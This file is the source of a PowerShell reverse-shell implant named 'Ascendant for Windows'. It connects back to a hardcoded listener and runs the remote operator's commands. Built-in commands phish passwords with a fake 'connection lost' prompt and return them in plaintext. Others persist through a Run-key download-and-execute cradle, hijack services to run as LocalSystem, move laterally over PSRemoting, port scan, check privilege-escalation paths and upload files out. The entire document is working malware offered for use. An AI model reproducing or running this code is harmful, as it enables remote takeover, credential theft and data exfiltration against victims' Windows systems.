$global:jobs = @{} 

function upload($src, $dst)
{
    $client = new-object System.Net.WebClient;
    try{$client.UploadFile($dst,$src);return ("{^} uploaded to " + $dst + "`n")}
    catch{return "{^} could not upload file"}
}

function download($url, $dst)
{
    $client = new-object System.Net.WebClient;
    try{$client.DownloadFile($src,$dst);return ("{^} downloaded to " + $dst + "`n")}
    catch{return "{^} could not download file"}
}

function prompt-password($user)
{
    $ErrorActionPreference = 'silentlycontinue'
    if($user -eq $null){$getpass = Get-Credential -Message "Your connection to the network has been lost. Please enter your credentials below:" -UserName $user}
    else{$getpass = Get-Credential -Message "Your connection to the network has been lost. Please enter your credentials below:"};
    if($getpass -ne $null)
    {
        $name = $getpass.UserName;
        $pass = $getpass.Password;
        $convertpass = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass);
        $plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($convertpass);
        return $($name + " : " + $plaintext)
    }
    else
    {
        return "{^} the user did not enter credentials"
    }
}

function configure-service($svc,$config)
{
    $ErrorActionPreference = 'silentlycontinue'
    try{$getsvc = get-service $svc}catch{};
    if ($getsvc -eq $null){return "{^} could not find specified service"}
    else
    {
        try{
            iex $('sc.exe config ' + $svc + ' binpath= ' + $config) | Out-Null;
            iex $('sc.exe config ' + $svc + ' obj= ".\LocalSystem" password= ""') | Out-Null;
            service-start $svc;
            $set = $true
        }catch{$output = "{^} could not start or reconfigure the service`n"}
        if ($set -eq $true)
        {
            $output = "{^} successfully configured and started the service`n"
        }
        else
        {
            $output = "{^} could not start or reconfigure the service`n" 
        }
        return $output 
    }
}

function psrmexec($command,$us,$ps,$rh)
{
    $secstring = ConvertTo-SecureString $ps -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential($us, $secstring);
    try{$session = new-pssession -ComputerName $rh -Credential $credential}catch{continue}
    try
    {
        $cmd = "invoke-command -Session `$session {iex " + $command + "}";
        $exec = ($(iex $cmd) -join "`n" + "`n");
        Remove-PSSession $session;
        return $("{^} command executed with the following output:`n" + $exec)
    }catch{continue}
}

function portscan($rhst,$brt)
{
    $rhst = $rhst.replace(" ","");
    $brt = $brt.replace(" ","");
    $borts = @();
    $rhost = @();
    if ($brt.contains(","))
    {
        $borts = $brt.split(",");
    }
    elseif ($brt.contains("-"))
    {
        $trb = $brt.split("-");
        foreach ($ib in [int]$trb[0]..[int]$trb[1])
        {
            $borts += $ib;
        }
    }
    else
    {
        $borts = $brt.split(" ");
    }

    if ($rhst.contains(","))
    {
        $rhost = $rhst.split(",");
    }
    elseif ($rhst.contains("-"))
    {
        $kr = $rhst.split("-")[0];
        $kv = $rhst.split("-")[1];
        $ki = $kr.split(".")[-1];
        $ka = $kv.split(".")[-1];
        $km = $kr.split(".")[0..2];
        $kl = ($km -join [char]46) + [char]46;
        foreach($i in $ki..$ka)
        {
            $rhost += $kl + $i.tostring();
        }
    }
    else
    {
        $rhost = $rhst;
    };
    $bh = @();
    foreach ($bt in $borts)
    {
        $ErrorActionPreference= 'silentlycontinue';
        foreach ($a in $rhost)
        {
            $bc = new-object System.Net.Sockets.TcpClient;
            $bs = $bc.BeginConnect($a,$bt,$null,$null);
            $bg = $bs.AsyncWaitHandle.WaitOne(1,$false);
            if ($bg -eq $false)
            {
                continue;
            }
            else
            {
                try
                {
                    $bc.EndConnect($bs);
                    $sk = ($a + ":" + $bt.tostring());
                    $bh += ($sk);
                }
                catch{continue}
            }
        }
    }
    if ($bh.length -eq 0){return "{^} no open ports found on supplied hosts"}else{return $("{^} the following open ports were found:`n" + ($bh -join "`n" + "`n"))}
}

function persist($url)
{
    $persistpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";
    Set-ItemProperty -Path $persistpath -Name "protector" -value $("cmd.exe /k powershell.exe -w 1 iex (new-object system.net.webclient).downloadstring('" + $url + "')");
    return "{^} Persisted in HKCU Run key`n";
}

function runelevated($command,$user,$password)
{
    $secstring = ConvertTo-SecureString $password -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential($user, $secstring);   
    try{$invocation = [system.diagnostics.process]::start("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$command,$credential.UserName,$credential.Password,$(hostname));return $invocation}
    catch{return "{^} could not run elevated`n"}
}

function filesearch($method,$search,$dir)
{
    $gcir = (gci -r $dir).FullName;
 
    $files = @();
    if ($method -eq "name")
    {
        foreach ($fl in $gcir)
        {
            if ($($fl).tolower().contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    elseif ($method -eq "content")
    {
        foreach ($fl in $gcir)
        {
            if ($(get-content $fl).tolower().contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    elseif ($method -eq "owner")
    {
        foreach ($fl in $gcir)
        {
            if (($(get-acl $fl).owner).tolower().Contains($search.tolower()))
            {
                $files += ($fl)
            }
        }
    }
    if ($files.Count -eq 0)
    {
        $files += ("{^} no matches`n")
    }
    return $($files -join "[\n]")
}

function privchecker($acl)
{
    if ($acl -eq $null)
    {
        $reginstall = @("HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer","HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer");
        $lm = test-path $reginstall[0];
        $cu = Test-Path $reginstall[1];
        $schtasks = Get-ScheduledTask;
        $privs = @();
        $privs += $(route print);
        $privs += $(get-process | out-string);
        $privs += $(netstat -ano);
        $privs += $(net users);
        $privs += $(net localgroup administrators);
        $privs += $(cmdkey.exe /list);
        $privs += $(wmic qfe get Description,HotFixID);
        $privs += "[>] SCHEDULED TASKS`n";
        foreach($s in $schtasks){$privs += $($s.taskname + "  :  " + $s.taskpath)};
        if($cu -eq $true -and $lm -eq $true)
        {
            $user = $(Get-ItemProperty $reginstall[0] -Name "AlwaysInstallElevated").AlwaysInstallElevated;
            $machine = $(Get-ItemProperty $reginstall[0] -Name "AlwaysInstallElevated").AlwaysInstallElevated;
            if($user -eq 1 -and $machine -eq 1){$privs += "`n[>] MSI installers will install with elevated permissions`n"}
        }
        return $($privs -join "`n");
    }
    else
    {
        $listacl = $((get-acl $acl).Access | out-string);
        return $listacl
    }
}

function cmdparse($data)
{
    $spdata = $data.split(" ");
	$cmd = $spdata[0];
	$args = @{};
    $key = $null;
	foreach ($x in $spdata[1..$($spdata.length - 1)])
    {
        if ($x.contains("=")){$esp = $x.split("=");$key = $esp[0];$args.add($esp[0],$esp[1])}
        else{$args.$key += $(" " + $x)}
    }
	if ($cmd -eq "upload"){$ret = upload $args["source"] $args["destination"]}
	elseif ($cmd -eq "download"){$ret = download $args["source"] $args["destination"]}
	elseif ($cmd -eq "configure-service"){$ret = configure-service $args["service"] $args["config"]}
	elseif ($cmd -eq "prompt-password"){$ret = prompt-password $args["user"]}
	elseif ($cmd -eq "psrmexec"){$ret = psrmexec $args["command"] $args["username"] $args["password"] $args["rhost"]}
    elseif ($cmd -eq "privchecker"){$ret = privchecker $args["acl"]}
	elseif ($cmd -eq "portscan"){$ret = portscan $args["host"] $args["port"]}
	elseif ($cmd -eq "persist"){$ret = persist $args["url"]}
	elseif ($cmd -eq "runelevated"){$ret = runelevated $args["command"] $args["user"] $args["password"]}
	elseif ($cmd -eq "filesearch"){$ret = filesearch $args["method"] $args["search"] $args["dir"]}
	return $ret
}

$embedded_commands = @{"help"="print this message";"upload"="upload file to http POST upload server";"download"="download file from http listener";"configure-service"="reconfigure service to run commandline";"prompt-password"="prompt user to enter password";"psrmexec"="execute command via psrmexec (credentialed)";"portscan"="connect scan and ping sweep";"persist"="install Ascendant";"runelevated"="run command as superuser (runs as job)";"filesearch"="search for files";"privchecker"="look for possible elevation mechanisms"}
$cmd_help = @{"upload"="usage : upload source=<source file> destination=<destination http url>`n";"download"="usage : download source=<source url> destination=<file absolute path>`n";
"configure-service"="usage : configure-service service=<service to configure> config=<value to insert into config as binpath>`n";"prompt-password"="usage : prompt-password user=<username to request credentials for>`n{^} WARNING: this may cause the shell to hang`n";"psrmexec"="usage : psrmexec command=<shell command to run> username=<user to authenticate as> password=<password for user> rhost=<remote ip>`n";"portscan"="usage : portscan host=<','-separated list or '-'-separated range> port=<','-separated list or '-'-separated range>`n";"persist"="usage : persist url=<full url hosting payload>`n";"runelevated"="usage : runelevated command=<command to run> user=<user to runas> password=<password of user>`n";"filesearch"="usage : filesearch method=<content / name / owner> search=<string to search for> dir=<top dir to recurse>`n";"privchecker"="usage : privchecker acl=<file to check acl on>`n"}
$lh = "192.168.1.204"
$lp = 443

$cn = [environment]::ExpandEnvironmentVariables("%COMPUTERNAME%");
$ic = @"

                      /\
             /'       }{       '\
            //\       }{       /\\
           //  \     /**\     /  \\
          //    \   </  \>   /    \\
         //      \   \\//   /      \\
        //   /    \  /\/\  /    \   \\
       //   /      \/ /\ \/      \   \\
      //   /   /      /\      \   \   \\
     //   /   /       /\       \   \   \\
    //   /   /   /    /\    \   \   \   \\
   //   /\  /\  /\  /\/\/\  /\  /\  /\   \\
    \  /  \/  \/  \/ \/\/ \/  \/  \/  \  / 
     \/             <\/\/>             \/  
                    / /\ \ 
                   /  /\  \
                   \/ \/ \/
                    \/\/\/
                      \/  
                      \/
                     <\/>
                      <>
                      \/
                      

                                    
{^} Ascendant for Windows, Version 1.0`n
"@;
$ih = ("{^} Hostname: " + [environment]::ExpandEnvironmentVariables("%COMPUTERNAME%") + "`n");
$ix = ("{^} System: " + $(gwmi win32_operatingsystem).version + "`n");
$ik = @"
{^} Type 'help' for a list of embedded commands or run a shell command
{^} Type 'exit' or 'quit' to close shell`n`n
"@
$im = ($ic + $ih + $ix + $ik)
$ci = [system.text.encoding]::ASCII.GetBytes($im);
$es = New-Object System.Net.Sockets.TcpClient;
$es.Connect($lh, $lp);
$ts = $es.GetStream();
$writer = New-Object System.IO.StreamWriter($ts);
$writer.AutoFlush = $true;
$writer.Write($ci, 0, $ci.length);
$buf = new-object System.Byte[] 1024;
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
$encoding = new-object System.Text.ASCIIEncoding
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
{
    $prompt = $("ascendant@" + $(hostname) + "~$ ")
}
else
{
    $prompt = $("root@" + $(hostname) + "~# ")
}
$writer.write($prompt)


while ($es.Connected)
{
    while ($ts.DataAvailable)
    {
        $tts = $ts.read($buf, 0, 1024);
        $re = $encoding.GetString($buf[0..($tts - 2)]);
        $cmdchk = $re.split(" ")[0]
        if ($re.contains("quit") -or $re.Contains("exit"))
        {
            exit;
        }
        elseif ($re.contains("help"))
        {
            $writer.write("{^} Aggress0r command list`n")
            $writer.write("{^} Type '<command> usage' for help message`n")
            foreach ($embed in $embedded_commands.keys)
            {
                $cmd = ("    {>} " + $embed + " : " + $embedded_commands[$embed] + "`n")
                $writer.write($cmd)
            }
        }
        elseif ($embedded_commands.ContainsKey($cmdchk))
        {
            if ($re.ToLower().Contains("usage"))
            {
                $ret_data = ("{^} " + $cmd_help[$cmdchk])
            }
            else
            {
                $ret_data = cmdparse $re
            }
            $writer.write($ret_data + "`n")
        }
        else
        {
            $shout = Invoke-Expression $re;
            foreach ($st in $shout)
            {
                $sk = $st | out-string;
                $writer.Write($sk)
            }
        }
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()); 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true)
        {
            $prompt = $("ascendant@" + $(hostname) + "~$ ")
        }
        else
        {
            $prompt = $([environment]::ExpandEnvironmentVariables("%USERNAME%") + "@" + $(hostname) + "~# ")
        }
        $writer.write($prompt); 
    }
    start-sleep -Milliseconds 500
}
$writer.Close()
